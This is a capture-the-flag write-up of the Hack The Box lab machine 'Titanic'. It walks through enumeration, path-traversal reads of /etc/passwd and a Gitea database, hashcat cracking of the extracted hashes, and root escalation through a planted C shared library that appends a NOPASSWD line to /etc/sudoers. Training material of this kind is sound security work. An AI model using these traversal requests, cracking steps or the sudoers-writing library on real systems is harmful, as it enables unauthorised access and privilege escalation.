---
layout: writeup
name: "Titanic"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
os: "Hack The BoxIP Address 10101155Difficulty EasyMedium  Seasonal"
date: 2025-11-12
pwned: true
---
CTF Writeup - Titanic (Hack The Box Seasonal)

💪 Machine Name: Titanic
![image (1)](https://github.com/user-attachments/assets/dd4bd9c2-1695-4c22-a8d4-ce05e22767e1)

Platform: Hack The BoxIP Address: 10.10.11.55Difficulty: Easy/Medium  (Seasonal)

🛍️ Overview

Titanic is a Seasonal Hack The Box machine with a simple LFI foothold, Gitea user extraction and hash cracking, and a subtle privilege escalation via LD_PRELOAD on a vulnerable ImageMagick identify script. This box heavily tests your patience and understanding of ImageMagick RCE vectors.

🔍 Enumeration

🔎 Nmap

nmap -p- 10.10.11.55 --min-rate 10000
nmap -p 22,80 10.10.11.55 -sCV -oN nmapscan

Results:

Ports: 22/tcp (OpenSSH 8.9), 80/tcp (Apache 2.4.52)

Webserver: http://titanic.htb/

🌐 Web Enumeration

Main page has a "booking form" that submits to /download?ticket=XYZ.json.

Simple LFI works:

GET /download?ticket=../../../../etc/passwd

→ Reveals /etc/passwd confirming LFI.

📚 Subdomain Fuzzing

ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb"

Finds:

dev.titanic.htb

📢 Gitea Source Leak

Git repo on http://dev.titanic.htb revealed:

git clone https://gitea.titanic.htb/developer/flask-app.git

Also from /etc/hosts:

10.10.11.55 titanic.htb dev.titanic.htb gitea.titanic.htb

💳 Gitea DB Dump and Hash Extraction

Using LFI, dumped:

GET /download?ticket=../../../home/developer/gitea/data/gitea/gitea.db

Cracked hashes:

wget https://gist.githubusercontent.com/h4rithd/.../gitea2hashcat.py
python3 gitea2hashcat.py gitea.db > hashes.txt

hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt

Result:

developer / 25282528

🚚 Developer Shell

ssh developer@titanic.htb

User developer has no sudo.

SUID/Capabilities not very useful.

But found interesting script:

cat /opt/scripts/identify_images.sh

cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log

We have write access to /opt/app/static/assets/images

/usr/bin/magick identify runs as root (via cron/systemd)

🔧 Privilege Escalation

❌ ImageMagick RCE attempts

Tried:

SVG with ephemeral:

XMP Comment trick

ICC Profile injection

All failed → ImageMagick likely patched or restricted.

💪 Final working method: LD_PRELOAD abuse

Compiled malicious .so:

// a.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}

gcc -fPIC -shared -o /opt/app/static/assets/images/libxcb.so.1 a.c -nostartfiles

Trigger:

When identify_images.sh runs, libxcb.so.1 is picked up by /usr/bin/magick identify → privilege escalation.

Now:

sudo cat /root/root.txt
5a9613d27f17e6a182101e75xxxx

🧪 Lessons Learned

LFI enumeration → real-world example.

Gitea DB hash cracking → how to format & crack.

ImageMagick identify abuse → creative RCE through LD_PRELOAD.

Dealing with modern ImageMagick restrictions → SVG, ICC, XMP may be patched.

Writeup by inksecGitHub: https://github.com/inkedqt
